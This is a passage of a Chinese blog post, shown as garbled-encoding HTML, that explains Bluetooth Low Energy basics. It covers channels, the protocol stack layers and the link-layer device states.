align="center">GFSK, Ï€&#x2F;4 DQPSK, 8DPSK</td></tr><tr><td align="center">ä¼ è¾“é€Ÿç‡</td><td align="center">LE 2M PHY: 2 Mb&#x2F;s LE 1M PHY: 1 Mb&#x2F;s LE Coded PHY (S&#x3D;2): 500 Kb&#x2F;s LE Coded PHY (S&#x3D;8): 125 Kb&#x2F;s</td><td align="center">EDR PHY (8DPSK): 3 Mb&#x2F;s EDR PHY (Ï€&#x2F;4 DQPSK): 2 Mb&#x2F;s BR PHY (GFSK): 1 Mb&#x2F;s</td></tr><tr><td align="center">å‘å°„é€Ÿç‡</td><td align="center">â‰¤ 100 mW (+20 dBm)</td><td align="center">â‰¤ 100 mW (+20 dBm)</td></tr><tr><td align="center">Rx Sensitivity</td><td align="center">LE 2M PHY: â‰¤-70 dBm LE 1M PHY: â‰¤-70 dBm LE Coded PHY (S&#x3D;2): â‰¤-75 dBm LE Coded PHY (S&#x3D;8): â‰¤-82 dBm</td><td align="center">â‰¤-70 dBm</td></tr><tr><td align="center">æ•°æ®ä¼ è¾“</td><td align="center">Asynchronous Connection-oriented Isochronous Connection-oriented Asynchronous Connectionless Synchronous Connectionless Isochronous Connectionless</td><td align="center">Asynchronous Connection-oriented Synchronous Connection-oriented</td></tr><tr><td align="center">é€šä¿¡æ‰‹æ®µ</td><td align="center">Point-to-Point (including piconet) Broadcast Mesh</td><td align="center">Point-to-Point (including piconet)</td></tr><tr><td align="center">Positioning Features</td><td align="center">Presence: Advertising Direction: <a href="https://www.bluetooth.com/zh-cn/learn-about-bluetooth/recent-enhancements/direction-finding/">Direction Finding</a> (AoA&#x2F;AoD) Distance: RSSI, <a href="https://www.bluetooth.com/zh-cn/specifications/in-development/">HADM</a> (Coming)</td><td align="center">None</td></tr></tbody></table><ul><li>æƒ³æƒ³è“ç‰™çš„åº”ç”¨ï¼Œå¦‚æ‰‹æœºä¸è“ç‰™è€³æœºã€ç”µè„‘ä¸æ— çº¿é¼ æ ‡ï¼Œæ˜¾ç„¶ä»–ä»¬æ˜¯C&#x2F;Sæ¶æ„ã€‚ä¸€èˆ¬è€Œè¨€è®¾å¤‡æä¾›æœåŠ¡ï¼Œå› æ­¤è®¾å¤‡æ˜¯serverï¼Œæ‰‹æœºä½¿ç”¨è®¾å¤‡æä¾›çš„æœåŠ¡ï¼Œå› æ­¤æ‰‹æœºæ˜¯clientã€‚æˆ‘ä»¬ç§°clientä¸ºä¸»æœºï¼Œserverä¸ºä»æœºã€‚</li><li>å¯¹äºè“ç‰™æœåŠ¡ç«¯è®¾å¤‡è€Œè¨€ï¼ˆæ³¨æ„æˆ‘ä»¬åªå…³æ³¨BLEé€šä¿¡ï¼‰ï¼Œå®ƒä»¬æ”¶é›†ä¿¡æ¯å­˜å‚¨èµ·æ¥ï¼Œå®¢æˆ·ç«¯å‘é€ä¸€æ¡å‘½ä»¤å®é™…ä¸Šå°±æ˜¯è·å–æœåŠ¡ç«¯å­˜å‚¨èµ·æ¥çš„æ•°æ®ã€‚å› æ­¤å¯ä»¥è¯´æœåŠ¡å…¶å®å°±æ˜¯å„ç§æœ‰ä»·å€¼çš„æ•°æ®ã€‚</li></ul><h3 id="BLEè§„æ ¼"><a href="#BLEè§„æ ¼" class="headerlink" title="BLEè§„æ ¼"></a>BLEè§„æ ¼</h3><p>å®˜æ–¹æ–‡æ¡£æˆªçš„å›¾ï¼Œç›®å‰è¿˜ä¸å¤ªèƒ½ç†è§£ï¼Œç­‰ç†è§£æ·±åˆ»ä¹‹åæ‰å›æ¥çœ‹çœ‹ã€‚</p><div align=center><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221026181024001.png" alt="image-20221026181024001" style="zoom:67%;" /></div><h3 id="ç‰©ç†ä¿¡é“"><a href="#ç‰©ç†ä¿¡é“" class="headerlink" title="ç‰©ç†ä¿¡é“"></a>ç‰©ç†ä¿¡é“</h3><p>åœ¨æ€»ç»“ä¸­å·²ç»æåˆ°ï¼ŒBLE å·¥ä½œåœ¨ 2.4GHz çš„é¢‘æ®µä¸Šï¼Œåˆ†ä¸º 40 ä¸ª RF ä¿¡é“ï¼Œæ¯ä¸ªä¿¡é“é—´éš”2MHZã€‚åŒä¸€æ—¶åˆ»ï¼Œåªèƒ½ç”¨ä¸€ä¸ªä¿¡é“è¿›è¡Œæ•°æ®çš„ä¼ è¾“&#x2F;æ¥æ”¶ã€‚</p><p>è¿™ 40 ä¸ª RF Channel ä¸Šï¼Œå¹¶ä¸æ˜¯å¹³ç­‰çš„ï¼Œ å¯ä»¥çœ‹åˆ°SIG æŠŠç‰©ç†ä¿¡é“è½¬æ¢æˆä¸ºä¸€ä¸ªå«åš Channel Index ã€‚ç‰©ç†ä¿¡é“ä» 0 - 39 è¿›è¡Œç¼–å·ã€‚è€ŒChannel Indexä¸ºPHY Ch0 å¯¹åº” 37ï¼ŒPHY Ch12 å¯¹åº” 38ï¼ŒPHY 39 å¯¹åº” 39ï¼š</p><div align=center><img src="https://img-blog.csdnimg.cn/2019070323511170.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pob3V0YW9wb3dlcg==,size_16,color_FFFFFF,t_70" alt="img" style="zoom:67%;" /></div><p>é—®ï¼šä¸ºä»€ä¹ˆè¿™ä¸‰ä¸ªå¹¿æ’­ä¿¡é“ä¹‹é—´éš”å¥½å‡ ä¸ªä¿¡é“ï¼Ÿ</p><p>ç­”ï¼šå› ä¸ºå¦‚WIFIä¹Ÿç”¨çš„2.4GHZï¼Œå¾ˆæœ‰å¯èƒ½è“ç‰™ä¿¡å·è¢«å¹²æ‰°ï¼Œè€Œå¹¿æ’­ä¿¡é“éš”å¼€è®¾è®¡å°±æ˜¯ä¸ºäº†é¿å…æ•°æ®ä¿¡é“è¢«å¹²æ‰°å¯¼è‡´å¹¿æ’­ä¿¡é“ä¸å¯ç”¨ã€‚å·ä¸ªå›¾è¯´æ˜ï¼š</p><div align=center><img src="https://pic1.zhimg.com/v2-b98249bf73445515154af85f462326b8_r.jpg" referrerpolicy="no-referrer" alt="img"></div><p>é™¤äº† 37ã€38ã€39 è¿™äº›é¢‘æ®µï¼Œåœ¨ Connection çŠ¶æ€ä¸‹ä½¿ç”¨äº† å…¶ä»–çš„ 37 ä¸ª Channelï¼Œé€šè¿‡è·³é¢‘æŠ€æœ¯ï¼ˆHoppingï¼‰ï¼Œæ¥å‡å°‘æ•°æ®å¹²æ‰°ï¼Œå¢å¼ºç³»ç»Ÿçš„å¯é æ€§ã€‚</p><h3 id="BLEåè®®æ ˆ"><a href="#BLEåè®®æ ˆ" class="headerlink" title="BLEåè®®æ ˆ"></a>BLEåè®®æ ˆ</h3><h4 id="åè®®æ ˆå±‚æ¬¡ç»“æ„"><a href="#åè®®æ ˆå±‚æ¬¡ç»“æ„" class="headerlink" title="åè®®æ ˆå±‚æ¬¡ç»“æ„"></a>åè®®æ ˆå±‚æ¬¡ç»“æ„</h4><p>ä¸‹å›¾è¯´æ˜äº†BLEçš„åè®®æ ˆæ„æˆã€‚å¯ä»¥çœ‹åˆ°æœ¬èº«è“ç‰™å®˜æ–¹å®šä¹‰åè®®æ ˆæ˜¯ç”±Profilesï¼ŒHOSTä¸»æœºå’ŒControlleræ§åˆ¶å™¨ç»„æˆã€‚ å…¶ä¸­åœ¨HOSTå’ŒControllerä¹‹ä¸­ç”±ä¸»æœºæ§åˆ¶å™¨æ¥å£ï¼ˆHCIï¼‰è¿æ¥ï¼ŒHCIæ˜¯å®ƒä»¬ä¹‹é—´çš„é€»è¾‘æ¥å£ï¼Œæ³¨æ„ä¸æ˜¯ç‰©ç†ç»„ä»¶ã€‚åœ¨åº•å±‚ç‰©ç†ä¼ è¾“æ–¹é¢ï¼ŒHCIå¯ä»¥ç”¨è®¸å¤šä¸åŒçš„æ–¹å¼å®ç°ï¼Œä½†é€»è¾‘æˆ–åŠŸèƒ½æ¥å£æ€»æ˜¯ç›¸åŒçš„ã€‚</p><p>ä¸ºäº†æ›´å¥½ç†è§£æˆ‘ä»¬æŠŠåè®®æ ˆåˆ†ä¸ºåº”ç”¨å±‚ï¼Œåè®®æ ˆä»¥åŠradioã€‚åè®®æ ˆä¹‹ä¸Šå°±æ˜¯applicationåº”ç”¨å±‚ï¼Œä¹Ÿå«Profilesï¼Œä¸€ä¸ªProfileå°±æ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚æ¯”å¦‚ç”µæ± ï¼Œç¡çœ ï¼Œå¿ƒç‡è¿™äº›å¸¸è§è“ç‰™è®¾å¤‡æä¾›çš„åŠŸèƒ½ã€‚</p><p>å¯ä»¥çœ‹åˆ°BLEåè®®æ ˆè‡ªæˆä½“ç³»ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221102144739324.png" alt="image-20221102144739324" style="zoom:50%;align:center;"/><h4 id="åè®®æ ˆå„å±‚-x2F-åè®®èŒèƒ½"><a href="#åè®®æ ˆå„å±‚-x2F-åè®®èŒèƒ½" class="headerlink" title="åè®®æ ˆå„å±‚&#x2F;åè®®èŒèƒ½"></a>åè®®æ ˆå„å±‚&#x2F;åè®®èŒèƒ½</h4><p>çŸ¥è¯†è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œå…ˆæ€»ç»“ä¸€ä¸‹å„å±‚èŒèƒ½ï¼Œä¹‹åå†è¯¦ç»†å»çœ‹ã€‚</p><h5 id="Physical-Layer-ç‰©ç†å±‚"><a href="#Physical-Layer-ç‰©ç†å±‚" class="headerlink" title="Physical Layer ç‰©ç†å±‚"></a>Physical Layer ç‰©ç†å±‚</h5><p>ç‰©ç†å±‚å®šä¹‰äº†æ— çº¿ç”µå‘å°„å™¨&#x2F;æ¥æ”¶å™¨å¦‚ä½•ç”¨äºç¼–ç å’Œè§£ç æ•°å­—æ•°æ®çš„ä¼ è¾“å’Œæ¥æ”¶ï¼Œä»¥åŠå…¶ä»–é€‚ç”¨çš„æ— çº¿ç”µç›¸å…³å‚æ•°å’Œå±æ€§ã€‚</p><h5 id="Link-Layer-é“¾è·¯å±‚"><a href="#Link-Layer-é“¾è·¯å±‚" class="headerlink" title="Link Layer é“¾è·¯å±‚"></a>Link Layer é“¾è·¯å±‚</h5><p>LLå±‚æ˜¯æ•´ä¸ªBLEåè®®æ ˆçš„æ ¸å¿ƒã€‚è¿™ä¸€å±‚å®šä¹‰äº†ç©ºä¸­æ¥å£æ•°æ®åŒ…çš„æ ¼å¼ï¼Œå…·ä½“åœ¨å“ªä¸€ä¸ªæ—¶é—´ç‚¹æŠŠæ•°æ®åŒ…å‘é€å‡ºå»ï¼Œæ€ä¹ˆä¿è¯æ•°æ®çš„å®Œæ•´æ€§ï¼ŒACKå¦‚ä½•æ¥æ”¶ï¼Œå¦‚ä½•è¿›è¡Œé‡ä¼ ï¼Œä»¥åŠå¦‚ä½•å¯¹é“¾è·¯è¿›è¡Œç®¡ç†å’Œæ§åˆ¶ç­‰ç­‰ã€‚LLå±‚ä¸è´Ÿè´£è§£æï¼Œåªè§„å®šæ ¼å¼ï¼Œå¯¹æ•°æ®è¿›è¡Œæ€æ ·çš„è§£æåˆ™äº¤ç»™ä¸Šé¢çš„GAPæˆ–è€…ATTã€‚</p><h5 id="HCI-ä¸»æœº-æ§åˆ¶-æ¥å£"><a href="#HCI-ä¸»æœº-æ§åˆ¶-æ¥å£" class="headerlink" title="HCI ä¸»æœº-æ§åˆ¶-æ¥å£"></a>HCI ä¸»æœº-æ§åˆ¶-æ¥å£</h5><p>HOSTå’ŒControllerä¹‹é—´çš„æ¡¥æ¢ã€‚ä¸ºHOSTå’ŒControllerä¹‹é—´çš„å‘½ä»¤å’Œæ•°æ®çš„åŒå‘é€šä¿¡æä¾›ä¸€ä¸ªæ˜ç¡®çš„åŠŸèƒ½æ¥å£ã€‚</p><h5 id="L2CAPå±‚"><a href="#L2CAPå±‚" class="headerlink" title="L2CAPå±‚"></a>L2CAPå±‚</h5><p>å¯¹ä¸Šå±‚è¿›è¡Œå¤šè·¯å¤ç”¨ï¼Œæ”¯æŒå¯¹ä¸Šå±‚PDUçš„åˆ†å‰²å’Œé‡ç»„ï¼Œæ”¯æŒæµé‡æ§åˆ¶ã€‚LLåªå…³å¿ƒä¼ è¾“çš„æ•°æ®è‡ªå·±ï¼ŒL2CAPå°±è¦åŒºåˆ†æ˜¯åŠ å¯†é€šé“ä»æ˜¯æ™®é€šé€šé“ï¼ŒåŒæ—¶è¿˜è¦å¯¹é“¾æ¥é—´éš”è¿›è¡Œç®¡ç†ã€‚</p><h5 id="ATT-æ•°æ®äº¤äº’åè®®"><a href="#ATT-æ•°æ®äº¤äº’åè®®" class="headerlink" title="ATT æ•°æ®äº¤äº’åè®®"></a>ATT æ•°æ®äº¤äº’åè®®</h5><p>ATTå±‚ç”¨æ¥å®šä¹‰ç”¨æˆ·å‘½ä»¤åŠå‘½ä»¤æ“ä½œçš„æ•°æ®ï¼Œå®ƒçš„å…³é”®å°±æ˜¯å‘½ä»¤ã€‚</p><p>ATTå‘½ä»¤å¯ä»¥å¤§è‡´åˆ†ä¸º4ç±»ï¼šreadè¯»ï¼Œwriteå†™ï¼Œnotify(é€šçŸ¥)å’Œindicate(æŒ‡ç¤º)ã€‚è¿™äº›å‘½ä»¤åˆå¯ä»¥åˆ†æˆä¸¤ç§ï¼šå¦‚æœå®ƒéœ€è¦responseï¼Œé‚£ä¹ˆä¼šåœ¨ç›¸åº”å‘½ä»¤åé¢åŠ ä¸Šrequestï¼›ç›¸åï¼Œå¦‚æœå®ƒåªéœ€è¦ACKè€Œä¸éœ€è¦responseï¼Œé‚£ä¹ˆå®ƒçš„åé¢å°±ä¸ä¼šå¸¦requestã€‚<strong>ATTçš„æ¯ä¸ªå‘½ä»¤å‘å‡ºå»ä¹‹åï¼Œä¼šç«‹é©¬ç­‰ACKä¿¡æ¯ï¼Œå¦‚æœæ”¶åˆ°äº†ACKåŒ…ï¼Œå‘é€æ–¹è®¤ä¸ºå‘½ä»¤å®Œæˆï¼›å¦åˆ™å‘é€æ–¹ä¼šä¸€ç›´é‡ä¼ è¯¥å‘½ä»¤ç›´åˆ°è¶…æ—¶å¯¼è‡´BLEè¿æ¥æ–­å¼€</strong>ã€‚</p><p>BLEåè®®æ ˆä¸­ï¼Œå¼€å‘è€…æ¥è§¦æœ€å¤šçš„å°±æ˜¯ATTã€‚<strong>BLEå¼•å…¥äº†attributeæ¦‚å¿µï¼Œç”¨æ¥æè¿°ä¸€æ¡ä¸€æ¡çš„æ•°æ®</strong>ã€‚Attributeé™¤äº†å®šä¹‰æ•°æ®ï¼ŒåŒæ—¶å®šä¹‰è¯¥æ•°æ®å¯ä½¿ç”¨çš„ATTå‘½ä»¤ï¼Œæ‰€ä»¥è¿™ä¸€å±‚è¢«ç§°ä¸ºATTå±‚ã€‚æ³¨æ„ï¼šATTä¹Ÿæ˜¯è“ç‰™ç©ºå£åŒ…ä¸­çš„æœ€ä¸Šå±‚</p><h5 id="SMP-å®‰å…¨ç®¡ç†å±‚"><a href="#SMP-å®‰å…¨ç®¡ç†å±‚" class="headerlink" title="SMP å®‰å…¨ç®¡ç†å±‚"></a>SMP å®‰å…¨ç®¡ç†å±‚</h5><p>SMPç”¨æ¥ç®¡ç†BLEé“¾æ¥çš„åŠ å¯†å’Œå®‰å…¨ï¼Œå¦‚ä½•ä¿è¯é“¾æ¥çš„å®‰å…¨æ€§ï¼ŒåŒæ—¶ä¸å½±å“ç”¨æˆ·çš„ä½“éªŒã€‚</p><h5 id="GATT"><a href="#GATT" class="headerlink" title="GATT"></a>GATT</h5><p>GATTç”¨æ¥è§„èŒƒattributeä¸­çš„æ•°æ®å†…å®¹ï¼Œå¹¶è¿ç”¨groupï¼ˆåˆ†ç»„ï¼‰çš„æ¦‚å¿µå¯¹attributeè¿›è¡Œåˆ†ç±»ç®¡ç†ã€‚æ²¡æœ‰GATTï¼ŒBLEåè®®æ ˆä¹Ÿèƒ½è·‘ï¼Œä½†äº’è”äº’é€šå°±ä¼šå‡ºé—®é¢˜ï¼Œä¹Ÿæ­£æ˜¯ç”±äºæœ‰äº†GATTå’Œå„ç±»å„æ ·çš„åº”ç”¨profileï¼ŒBLEæ‘†è„±äº†ZigBeeç­‰æ— çº¿åè®®çš„å…¼å®¹æ€§å›°å¢ƒï¼Œæˆäº†å‡ºè´§é‡æœ€å¤§çš„2.4Gæ— çº¿é€šè®¯äº§å“ã€‚</p><h5 id="GAP"><a href="#GAP" class="headerlink" title="GAP"></a>GAP</h5><p>å®šä¹‰äº†åœ¨éè¿æ¥çŠ¶æ€ä¸‹å¯ä½¿ç”¨çš„æ“ä½œæ¨¡å¼å’Œç¨‹åºï¼Œæ¯”å¦‚å‘èµ·å¹¿æ’­ï¼Œæ‰«æå’Œå‘èµ·è¿æ¥ã€‚å®šä¹‰äº†å®‰å…¨çº§åˆ«å’Œæ¨¡å¼ã€‚</p><h3 id="BLEè¿æ¥çŠ¶æ€åŠè¿‡ç¨‹"><a href="#BLEè¿æ¥çŠ¶æ€åŠè¿‡ç¨‹" class="headerlink" title="BLEè¿æ¥çŠ¶æ€åŠè¿‡ç¨‹"></a>BLEè¿æ¥çŠ¶æ€åŠè¿‡ç¨‹</h3><p>BLEè®¾å¤‡æœ‰ä¸ƒç§çŠ¶æ€ï¼š</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221102145101332.png" alt="image-20221102145101332" style="zoom:80%;align:center" /><h4 id="å°±ç»ªæ€-Standby"><a href="#å°±ç»ªæ€-Standby" class="headerlink" title="å°±ç»ªæ€ Standby"></a>å°±ç»ªæ€ Standby</h4><p>å¯ä»¥ç†è§£ä¸ºæ‘†çƒ‚çŠ¶æ€ã€‚</p><p>å¤„äºå°±ç»ªæ€çš„é“¾è·¯å±‚ä»€ä¹ˆä¹Ÿä¸å¹²ï¼Œä¸€æ—¦é“¾è·¯å±‚æ¥æ”¶åˆ°åº”ç”¨å±‚æŒ‡ä»¤é‚£ä¹ˆè®¾å¤‡å°±ä¼šè¿›å…¥åˆ°ç›¸åº”çš„çŠ¶æ€ï¼Œä¸€æ—¦è®¾å¤‡ç©ºé—²ä¸‹æ¥ï¼Œåˆ™åˆä¼šè¿›å…¥å°±ç»ªæ€ã€‚</p><h4 id="å¹¿æ’­æ€-Advertising"><a href="#å¹¿æ’­æ€-Advertising" class="headerlink" title="å¹¿æ’­æ€ Advertising"></a>å¹¿æ’­æ€ Advertising</h4><p>å¹¿æ’­æ€çš„åŠŸèƒ½ï¼Œå°±æ˜¯è®©å‘¨å›´è®¾å¤‡èƒ½å¤Ÿå‘ç°è‡ªå·±ã€‚</p><p>å¤„äºå¹¿æ’­æ€çš„é“¾è·¯å±‚ä¼šå‘é€å¹¿æ’­æŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡ä¼šè¢«å‘¨å›´è®¾å¤‡æœç´¢å¹¶è§£æå‡ºæ¥ï¼Œå¹¿æ’­æŠ¥æ–‡çš„å†…å®¹åŒ…æ‹¬äº†è®¾å¤‡æ˜¯å¦å¯è¢«è¿æ¥ï¼Œè®¾å¤‡çš„åå­—ï¼Œè®¾å¤‡çš„åœ°å€ï¼Œè®¾å¤‡æä¾›çš„æœåŠ¡åŠå…¶ä»–ç›¸å…³ä¿¡æ¯ã€‚æ”¶åˆ°å¹¿æ’­æŠ¥æ–‡çš„è®¾å¤‡å¯ä»¥å‘é€å›åº”æŠ¥æ–‡ï¼Œå¹¿æ’­æ€çš„é“¾è·¯å±‚è¿˜å¯ä»¥ç›‘å¬è¿™ç§å›åº”æŠ¥æ–‡ï¼Œå¹¶ä½œå‡ºå“åº”ã€‚</p><h4 id="æ‰«ææ€-Scanning"><a href="#æ‰«ææ€-Scanning" class="headerlink" title="æ‰«ææ€ Scanning"></a>æ‰«ææ€ Scanning</h4><p>æ‰«ææ€çš„ä¸»è¦åŠŸèƒ½ï¼Œå°±æ˜¯æ¥å—å¹¿æ’­æŠ¥æ–‡ä»¥å‘ç°å‘¨å›´çš„è®¾å¤‡ã€‚æ‰«æè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸»åŠ¨æ‰«æå’Œè¢«åŠ¨æ‰«æã€‚</p><p>è¢«åŠ¨æ‰«æï¼Œå°±æ˜¯ç›‘å¬ï¼ˆå¹¿æ’­ï¼‰ä¿¡é“ï¼Œå¹¶ä¸”ä¸ä¼šå‘å‘¨å›´å‘é€ä»»ä½•æŠ¥æ–‡ï¼Œå‘¨å›´è®¾å¤‡å‘é€çš„éå®šå‘å¹¿æ’­æŠ¥æ–‡éƒ½å¯ä»¥è¢«æ¥æ”¶åˆ°ã€‚éå®šå‘æŠ¥æ–‡æ˜¯æŒ‡ï¼Œæ²¡æœ‰æŒ‡å®šæŠ¥æ–‡æ¥æ”¶åœ°å€çš„æŠ¥æ–‡ã€‚</p><p>ä¸»åŠ¨æ‰«æï¼Œå°±æ˜¯ä¸»åŠ¨å‘å‡ºæ‰«æè¯·æ±‚çš„æŠ¥æ–‡ï¼Œå¤„äºå¹¿æ’­çŠ¶æ€çš„é“¾è·¯å±‚ä¼šç›‘å¬è¿™ç§æŠ¥æ–‡ï¼Œæ”¶åˆ°å¹¿æ’­æŠ¥æ–‡åè¿˜å¯ä»¥å‘é€æŠ¥æ–‡è¯¢é—®è¯¦ç»†ä¿¡æ¯ï¼Œæ¥æ”¶æ–¹æ”¶åˆ°æŠ¥æ–‡åä¼šå‘å‡ºå›åº”æŠ¥æ–‡ï¼Œè¿™ç§å›åº”æŠ¥æ–‡æ˜¯å®šå‘æŠ¥æ–‡ï¼Œåªèƒ½è¢«å‘å‡ºæ‰«æè¯·æ±‚çš„è®¾å¤‡æ¥æ”¶å¹¶è§£æå‡ºæ¥ã€‚</p><h4 id="è¿æ¥æ€-Connecting"><a href="#è¿æ¥æ€-Connecting" class="headerlink" title="è¿æ¥æ€ Connecting"></a>è¿æ¥æ€ Connecting</h4><p>è¿æ¥æ€ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯è®¾å¤‡è¿æ¥å»ºç«‹å®Œæˆä¹‹åçš„çŠ¶æ€ï¼Œä»åº”ç”¨å±‚çš„è§’åº¦æ¥çœ‹ï¼Œä¸¤ä¸ªè®¾å¤‡å·²ç»æˆåŠŸå»ºç«‹äº†ç‰©ç†è¿æ¥ï¼Œå¹¶ä¸”å¯ä»¥äº¤äº’ç”¨æˆ·æ•°æ®äº†ã€‚</p><h4 id="å‘èµ·æ€-Initiating"><a href="#å‘èµ·æ€-Initiating" class="headerlink" title="å‘èµ·æ€ Initiating"></a>å‘èµ·æ€ Initiating</h4><p>å‘èµ·æ€ï¼Œæ˜¯å‡†å¤‡å‘èµ·è¿æ¥åˆ°è¿æ¥å®Œæˆå‰çš„ä¸€æ®µçŠ¶æ€ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯å®Œæˆè¿æ¥æ‰€éœ€è¦çš„æ‰€æœ‰è¿‡ç¨‹ã€‚</p><h4 id="ç­‰æ—¶å¹¿æ’­çŠ¶æ€-Isochronous-Broadcasting"><a href="#ç­‰æ—¶å¹¿æ’­çŠ¶æ€-Isochronous-Broadcasting" class="headerlink" title="ç­‰æ—¶å¹¿æ’­çŠ¶æ€ Isochronous Broadcasting"></a>ç­‰æ—¶å¹¿æ’­çŠ¶æ€ Isochronous Broadcasting</h4><p>ç­‰æ—¶å¹¿æ’­çŠ¶æ€å¯ä»¥é€šè¿‡å¹¿æ’­é€šé“å‘é€BIS(Broadcast Isochronous Stream) æ•°æ®æŠ¥æ–‡ï¼Œç”±StandbyçŠ¶æ€è¿›å…¥ã€‚æƒ³å‘ä¸€å®šåŒºåŸŸå†…å…¶å®ƒè®¾å¤‡å¹¿æ’­åŒæ­¥æ•°æ®æµï¼ˆæ¯”å¦‚éŸ³é¢‘æ•°æ®æµï¼‰çš„è®¾å¤‡éœ€è¦å¤„äºIsochronous BroadcastingçŠ¶æ€ï¼Œå¤„äºè¯¥çŠ¶æ€çš„è®¾å¤‡ç§°ä¸ºIsochronous Broadcasterã€‚å¤„äºIsochronous BroadcastingçŠ¶æ€çš„é“¾è·¯å±‚çŠ¶æ€æœºåº”å‘é€ç”±ä¸€ä¸ªæˆ–å¤šä¸ªBIS ç»„æˆçš„BIG(Broadcast Isochronous Group)ï¼Œæ¯ä¸ªBIGæœ€å¤šåŒ…å«31ä¸ªBISï¼Œæ¯ä¸ªBISæ‰¿è½½ä¸€ä¸ªå•ç‹¬çš„åŒæ­¥æ•°æ®æµã€‚ä¼ è¾“ç¬¬ä¸€ä¸ªBIS æ•°æ®æŠ¥æ–‡åé“¾è·¯å±‚åº”é€šçŸ¥ä¸»æœºï¼Œè‹¥åœæ­¢åŒæ­¥å¹¿æ’­åˆ™å›åˆ°StandbyçŠ¶æ€ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™ç©æ„å„¿æœ‰ç‚¹åƒå¹¶å‘ï¼Œè²Œä¼¼QOSçš„æ‹¥å¡æ§åˆ¶çš„å®šåˆ¶é˜Ÿåˆ—ä¹Ÿæ˜¯è¿™ä¸ªæ€æƒ³ï¼ˆæŠŠæ•°æ®åŒ…åˆ†æˆä¸åŒçš„é˜Ÿåˆ—ï¼Œè½®è¯¢çš„å‘é˜Ÿåˆ—å–æ•°æ®ï¼Œæ¯æ¬¡åªå–ä¸€ä¸ªï¼‰</p><h4 id="åŒæ­¥æ¥æ”¶çŠ¶æ€-Synchronization"><a href="#åŒæ­¥æ¥æ”¶çŠ¶æ€-Synchronization" class="headerlink" title="åŒæ­¥æ¥æ”¶çŠ¶æ€ Synchronization"></a>åŒæ­¥æ¥æ”¶çŠ¶æ€ Synchronization</h4><p>å¯ä»¥é€šè¿‡å¹¿æ’­é€šé“æ¥æ”¶BISåŒæ­¥æ•°æ®æµï¼Œç”±StandbyçŠ¶æ€è¿›å…¥ã€‚SynchronizationçŠ¶æ€å¯ç”¨äºä¾¦å¬ä¸€å®šåŒºåŸŸå†…çš„BISå¹¿æ’­åŒæ­¥æ•°æ®æµï¼ˆæ¯”å¦‚éŸ³é¢‘æ•°æ®æµï¼‰ï¼Œå¤„äºSynchronizationçŠ¶æ€å¹¶ä¸”æ­£åœ¨æ¥æ”¶åŒæ­¥æ•°æ®åŒ…çš„è®¾å¤‡ç§°ä¸ºSynchronized Receiverï¼Œåªèƒ½å•å‘æ¥æ”¶BIGï¼Œå¦‚æœåœ¨ä¸»æœºæŒ‡å®šæ—¶é—´å†…æœªä¾¦å¬åˆ°ä»»ä½•æœ‰æ•ˆBIGï¼Œå¤„äºè¯¥çŠ¶æ€çš„è®¾å¤‡å°†å›åˆ°StandbyçŠ¶æ€å¹¶é€šçŸ¥ä¸»æœºã€‚</p><h4 id="Isochronous-Broadcaster-â€”-Synchronized-Receiver"><a href="#Isochronous-Broadcaster-â€”-Synchronized-Receiver" class="headerlink" title="Isochronous Broadcaster â€” Synchronized Receiver"></a>Isochronous Broadcaster â€” Synchronized Receiver</h4><p>ç»™å‡ºä¸€ç¯‡åšå®¢çš„ä¾‹å­ã€‚</p><p>ç­‰æ—¶å¹¿æ’­è€…ä¸åŒæ­¥æ¥æ”¶è€…ä¹‹é—´é€šè¿‡å¹¿æ’­ä¿¡é“ä¼ è¾“åŒæ­¥æ•°æ®æµBISï¼ˆæ¯”å¦‚éŸ³é¢‘æ•°æ®æµï¼‰ï¼Œç­‰æ—¶åŒæ­¥å¹¿æ’­é€šä¿¡ä¹Ÿæ˜¯ä¸€ç§ä¸€å¯¹å¤šçš„é€šä¿¡æ–¹å¼ï¼Œæ˜¯åœ¨Bluetooth 5.2 ä¸­æ–°å¢çš„ï¼ŒåŒæ ·åªèƒ½è¿›è¡Œå•æ–¹å‘é€šä¿¡ï¼Œæ¯”å¦‚å¯ä»¥è®©å¬è®²åº§çš„ä¼—å¤šè§‚ä¼—å€ŸåŠ©æ”¯æŒè¯¥é€šä¿¡æ¨¡å¼çš„è“ç‰™è€³æœºåŒæ­¥å¬åˆ°ä¸€ä¸ªæ¼”è®²è€…ç­‰æ—¶å¹¿æ’­çš„éŸ³é¢‘æ•°æ®æµï¼›</p><h4 id="å¸¸è§è¿æ¥ç¤ºä¾‹"><a href="#å¸¸è§è¿æ¥ç¤ºä¾‹" class="headerlink" title="å¸¸è§è¿æ¥ç¤ºä¾‹"></a>å¸¸è§è¿æ¥ç¤ºä¾‹</h4><p>æ¯”å¦‚æ‰‹æœºAè¦è¿æ¥åä¸ºæ‰‹ç¯Bï¼Œé¦–å…ˆåä¸ºæ‰‹ç¯Bè¿›å…¥å¹¿æ’­æ€å‘å‘¨å›´è®¾å¤‡å‘èµ·å¹¿æ’­æŠ¥æ–‡ï¼ŒAè¿›å…¥æ‰«ææ€é€šè¿‡scanneræ¨¡å—æ¥å—Bå‘çš„å¹¿æ’­æŠ¥æ–‡ï¼Œå‘ç°è¯¥è®¾å¤‡ä¿¡æ¯åï¼ŒAè¿›å…¥å‘èµ·æ€ï¼Œå‘Bå‘èµ·è¿æ¥è¯·æ±‚ï¼ŒBæ¥æ”¶åˆ°è¿æ¥è¯·æ±‚åï¼Œç¡®è®¤æ˜¯ä¸æœ¬èº«é€šè®¯å‘å¹¿æ’­è€…å‘å“åº”ä¿¡æ¯ï¼Œè¿™æ 